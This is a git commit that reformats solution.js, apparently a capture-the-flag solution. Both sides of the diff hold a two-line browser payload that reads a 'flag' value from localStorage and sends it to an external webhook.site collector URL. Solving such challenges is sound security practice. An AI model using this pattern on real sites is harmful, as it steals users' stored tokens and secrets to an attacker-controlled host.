b634710fe8eaa97fa59a9a10622905e8bb60a5e8
Aylin Dora <aylin.leblebici@epfl.ch>
2026-03-10 23:38:55 +0100

    Fix formatting and add newline at end of file

--- solution.js
+++ solution.js
@@ -1,2 +1,2 @@
-const flag = localStorage.getItem('flag')
-fetch("https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb?flag=" + flag)
+const flag = localStorage.getItem("flag");
+fetch("https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb?flag=" + flag);
